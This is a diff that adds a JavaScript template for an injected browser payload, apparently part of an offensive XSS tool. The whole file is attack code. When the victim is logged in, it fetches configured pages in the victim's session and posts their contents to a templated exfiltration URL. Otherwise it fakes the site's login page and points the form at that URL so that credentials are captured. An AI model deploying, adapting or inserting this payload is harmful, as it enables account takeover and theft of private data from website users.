@@ -1,0 +1,52 @@
+(function() {
+  var loginCheckURL = {{{loginCheckURL}}};
+  var loginCheckPattern = /{{{loginCheckPattern}}}/i;
+  var loginURL = {{{loginURL}}};
+  var exfilURL = {{{exfilURL}}};
+
+  var script = document.createElement("script");
+  script.src = 'https://code.jquery.com/jquery-3.2.1.min.js';
+  script.type = 'text/javascript';
+  script.onload = function() {
+    (function($) {
+      var b = $('body');
+      b.html('');
+      $.get(loginCheckURL, function(r) {
+        if (r.match(loginCheckPattern)) {
+          var isSent = false;
+          var xdata = [];
+          var remaining = {{dataURLCount}};
+          var exfil = function() {
+            if (!isSent) {
+              $.post(exfilURL, JSON.stringify(xdata), function(r) {}, 'script');
+              isSent = true;
+            }
+          }
+          {{#dataURLs}}
+          $.{{method}}({{{url}}}{{{#data}}}, function(r) {
+            xdata.push({url: {{{url}}}, method: '{{{method}}}', response: r});
+            remaining -= 1;
+            if (remaining <= 0) { exfil(); }
+          }, 'text');
+          {{/dataURLs}}
+          window.setTimeout(exfil, 5000);
+        } else {
+          if (window.history && window.history.replaceState) {
+            window.history.replaceState({}, "Login", loginURL)
+          } else if (window.history && window.history.pushState) {
+            window.history.pushState({}, "Login", loginURL)
+          }
+          $.get(loginURL, function(r) {
+            b.html(r);
+            $('form').attr('action', exfilURL);
+            {{#loginExtraContent}}
+            $('form').append({{.}})
+            {{/loginExtraContent}}
+          }, 'text');
+        }
+      }, 'text');
+    })(window.jQuery.noConflict(true))
+  };
+  document.getElementsByTagName("head")[0].appendChild(script);
+})();
+
